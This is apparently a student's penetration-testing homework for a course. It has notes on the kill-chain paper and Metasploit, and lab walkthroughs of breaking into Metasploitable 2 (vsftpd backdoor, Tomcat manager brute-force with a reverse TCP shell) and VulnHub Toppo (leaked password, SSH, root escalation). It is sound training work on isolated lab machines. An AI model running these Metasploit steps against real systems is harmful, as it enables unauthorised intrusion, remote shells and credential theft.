# Week 2

## z) Read the articles and take notes.

### [Hutchins et al 2011: Intelligence-Driven Computer Network Defense Informed by Analysis of Adversary Campaigns and Intrusion Kill Chains](https://lockheedmartin.com/content/dam/lockheed-martin/rms/documents/cyber/LM-White-Paper-Intel-Driven-Defense.pdf)

- perspective of defending against APTs
- model breaks down phases of an attack, introduces a method for improving defenses

- APT intrusions are targeted, manually operated, advanced. Targets in industry and government
- conventional method of incident response unfit to fight APTs

- based on US military kill chains, analysis model of IED attacks

- "Intelligence-driven computer network defense is a risk management strategy"
- "This model shows, contrary to conventional wisdom, such aggressors have no inherent advantage over defenders."

- indicators of intrusion: atomic + computed = behavioral
- in the process of investigation, indicators lead to other indicators. Process must be tracked
- there is a model for indicator life cycle (??)

- "intrusion kill chain is defined as reconnaissance, weaponization, delivery, exploitation, installation, command and control (C2), and actions on objectives"
- action matrix to undermine each phase of killchain by "actions of detect, deny, disrupt, degrade, deceive, and destroy"
- zero-day exploits are still just one part of the attackers process. Thus, if defense against other steps in the kill chain work, the defense holds up
- learning from the attacker and evolving defenses. Phases of the kill chain can be thought of as layers in the defense, which in a sense turns on its head the classic wisdom of the attacker only having to find one hole, while the defender needs to plug them all
- detection is critical for improvement

- moving detection up the kill chain gives defender more chances
- "If defenders implement countermeasures faster than their known adversaries evolve, they maintain a tactical advantage."

- " The principle goal of campaign analysis is to determine the patterns and behaviors of the intruders,their tactics, techniques, and procedures (TTP), to detect “how” they operate rather than specifically “what” they do. "
- campaign analysis requires dividing attacks into campaigns, constructing stories through common indicators

- case study shows process of finding common factors in attacks - indicator overlap
- third attack in the campaign used zero-day exploit and had multiple other differences to earlier attacks, but was blocked based on the few common indicators earlier indentified by defender

- "The  intrusion  kill chain provides a structure to analyze intrusions, extract indicators and drive defensive courses of actions."
- "any one repeated component by the aggressor is a liability."



### [Jaswal 2020: Mastering Metasploit - 4ed: Chapter 1: Approaching a Penetration Test Using Metasploit](https://learning.oreilly.com/library/view/mastering-metasploit-/9781838980078/B15076_01_Final_ASB_ePub.xhtml#_idParaDest-30) from "Conducting a penetration test with Metasploit" till end of chapter.

- Exploit, payload, auxiliary, encoders, meterpreter

- benefits of metasploit: open source, saves time and energy, easy to add payloads, lower chance of crashing target system

- recon phase: port scanning, banner grabbing, ping scans, service detection scans

- nmap can be used from within metasploit, or reports can be imported

- save scan results into database. `db_status` to check

- create named workspace for database

- `db_namp -sV -Pn 192.168.188.129`, scan results saved into workspace

- scripts to detect OS and detect vulnerabilities

- use CVE code to search metasploit

- exploits ranked based on reliability

- example has auxiliary module that indentifies whether system is vulnerable

- set RHOST

- metasploit module has detailed information on how the exploit works

 - use exploit, set RHOST, set payload, show options. exploit. 

 - `sessions -u 1` to upgrade to meterpreter

 - can migrate meterpreter to other processes in the target system ( away from powershell)

- find administrator processes -> `load incognito` -> `list_tokens -u` -> `impersonate_token`

- psexec for Domain Controller machine access

- mimikatz or kiwi to dump password credentials from memory





## a) List tools and techniques for the phases of the Lockheed Martin Cyber Kill Chain, atleast one for each phase. Try 1-3 of the tools.

### Reconnaissance
passive: company webpage, linkedIn, financial records, search engines

active: port scanning, banner grabbing, service detection scans

### Weaponization
metasploit, creating a fake webpage, writing a phising email

### Delivery
picking specific exploitable program in metasploit (web delivery), sending emails, plugging in a USB stick

### Exploitation
exploit on metasploit, email attachments opened by target user, logging in with phished credentials

### Installation
meterpreter, installing backdoors, schedulers and similar to regain access

### Command and control (C2)
shell, privilege escalation, cracking downloaded password hashes

### Actions on objectives
metasploits downloading, shutting down functions, spreading misinformation, recording meetings with webcam

I used metasploit and nmap in the next exercise.

## b) Install Metaspoitable 2. Break in in multiple ways.

### Install and setup

Downloaded the metasploitable zip which contained .vmdk virtual machine file, ran it in VirtualBox Manager. Added to the machine a Host-only network adapter, also to the Kali virtualbox. Disconnected Kalis other network adapter to take it offline.

![VM network adapter settings](/week-2/vm-adapter.png)

Logged into metasploitable and ran ifconfig.

![ifconfig](/week-2/ifconfig.png)

Took down IP-address. Ran traceroute on Kali to make sure the network was set up right and tried to send a ping to hs.fi to make sure it was offline.

`msfconsole`

No database connected. Started postgres with `systemctl start postgresql` in another terminal. Created db for metasploit `sudo msfdb init`. Exited msfconsole and restarted it.

`workspace -a metasploitable` Db works, workspace is created.

Portscanned target with `db_nmap -sV 192.168.56.101`

![Nmap results](/week-2/nmap.png)

### First entry, ftp

Picked the ftp-service to study first. Version is ProFTPD 1.3.1.

`search ProFTPD`

![search results](/week-2/ms-search.png)

Out of these options number 4 looks good. Its rated excellent and has a Check-function, version looks right.
To read more, `info 4`. Turns out version isnt right after all. Going through all the other exploits shown by the search, none of them are for the right version. I googled "proftpd 1.3.1 cve" and there are vulnerabilities, but the exploits dont seem to be in my version of metasploit. There is also another ftp-service running, version vsftpd 2.3.4. Running a search for it (with version number included this time) looks promising. 

![second search results](/week-2/search-vsftpd.png)

Looking at the info for the exploit, default port setting 21 is correct. There is no checking module so Im just going for it.

`use 0`

`set RHOST 192.168.56.101`

Trying it with the default payload, as it is a unix system.

`exploit` It worked!

![exploit](/week-2/vsftpd-exploit.png)

`shell` gives us a bash shell with root. I look at the files and leave a little mark with `echo "vsftpd done" > exploited.txt` and call it a win.

![terminal](/week-2/vsftpd-bash.png)

### Second entry, tomcat

Going to try the http this time, so `search Apache httpd`. Results don't look too promising so i just open up the site in a browser and look around. Theres phpMyAdmin, mutillidae, Damn vulnerable Web Application. Leaving these alone for now, since we may look at more web stuff later in the course. 

Looking at the other http service, theres a tomcat server. `search Apache tomcat` shows an exploit mentioning an exposed manager-page, and looking at the page from the browser, there it is!

![Tomcat exploit info](/week-2/tomcat-info.png)

`use 5`
`set RHOST 192.168.56.101`
`set RPORT 8180`
`exploit`

Failing. 

![Tomcat exploit failed](/week-2/tomcat-fail.png)

This line "Failed: Error requesting /manager/html/serverinfo" seems to be the critical one.

Trying another exploit, nro 6 on the list. Seems to be similar but using a POST instead of PUT request.

`use 6`
`set RHOST 192.168.56.101`
`set RPORT 8180`

Same result as earlier. Now im thinking we will have to first find out the login credentials for the tomcat manager and then use this exploit to gain further access. Looking online I found an [article](https://pentestlab.blog/2012/03/22/apache-tomcat-exploitation/) also pointing that way. 

There is an auxiliary module scanner/http/tomcat_mgr_login. It looks like its going to try to bruteforce the login.

`use 19`
`set RHOST 192.168.56.101`
`set RPORT 8180`

Really exciting to watch it work. We have our credentials!

![Tomcat credentials](/week-2/tomcat-creds.png)

`use 6`
`set HttpPassword tomcat`
`set HttpUsername tomcat`
`exploit`

No errors, but no session created. Think the payload is wrong.
After some attempts at different payloads and looking around online I figured out I needed to give the exploit a localhost address to connect to.

`set payload java/shell/reverse_tcp`
`set lhost 192.168.56.102`
`set lport 4321` 
`exploit`

Works!

![Tomcat exploit success](/week-2/tomcat-success.png)

## c) Install a machine from VulnHub. Break in.

Chose Toppo: 1 as the target machine, it was one of the ones recommended for beginners.

Created virtualbox and installed the vdmk. Machine just shows its IP 192.168.56.103 and a login.

`msf6 > workspace -a toppo`

Lets start again with a portscan.

![Toppo nmap results](/week-2/toppo-nmap.png)

I open up the webpage and find a blog, that looks like its made from a template with minimal edits.

![Blog](/week-2/blog.png)

Opened another terminal and `owasp-zap`, used the automated attack tool. 

![Zap results](/week-2/zap.png)

The jquery and boostrap versions used by the site are old and there is comments containing some code.

I try to make sense of the jquery code to see if theres some vulnerability, but nothing jumps out at me, and I dont actually know jquery library. It also feels like who ever imaginary person set up this site didnt write the js code. I feel stuck and like im missing something obvious, look at a [guide](https://medium.com/egghunter/toppo-1-vulnhub-walkthrough-c5f05358cf7d) to find some next step to take. 

`dirb http://192.168.56.103`

While its running, I notice this.

![Admin is listable](/week-2/admin-listable.png)

So i just open the /admin/ page in browser and find this notes.txt

![notes with password](/week-2/notes.png)

So we have our password, 12345ted123. I tried manually logging in with the password as users root, debian, admin and ted. Ted works!

![SSH as ted](/week-2/ssh-ted.png)

I follow the above mentioned guides way of privilege escalation.

![Privilege escalation to root with python](/week-2/priv-escalation.png)


## Sources

https://terokarvinen.com/2021/hakkerointi-kurssi-tunkeutumistestaus-ict4tn027-3005/

https://subscription.packtpub.com/book/networking_and_servers/9781788623179/1/ch01lvl1sec19/configuring-postgresql

https://learning.oreilly.com/library/view/mastering-metasploit-/9781838980078/B15076_01_Final_ASB_ePub.xhtml#_idParaDest-30

https://www.cvedetails.com/vulnerability-list/vendor_id-9520/product_id-16873/version_id-99593/Proftpd-Proftpd-1.3.1.html

https://pentestlab.blog/2012/03/22/apache-tomcat-exploitation/

https://null-byte.wonderhowto.com/how-to/hack-apache-tomcat-via-malicious-war-file-upload-0202593/

https://emaragkos.gr/recommended-machines/

https://medium.com/egghunter/toppo-1-vulnhub-walkthrough-c5f05358cf7d

https://linuxconfig.org/ssh-password-testing-with-hydra-on-kali-linux

https://lockheedmartin.com/content/dam/lockheed-martin/rms/documents/cyber/LM-White-Paper-Intel-Driven-Defense.pdf

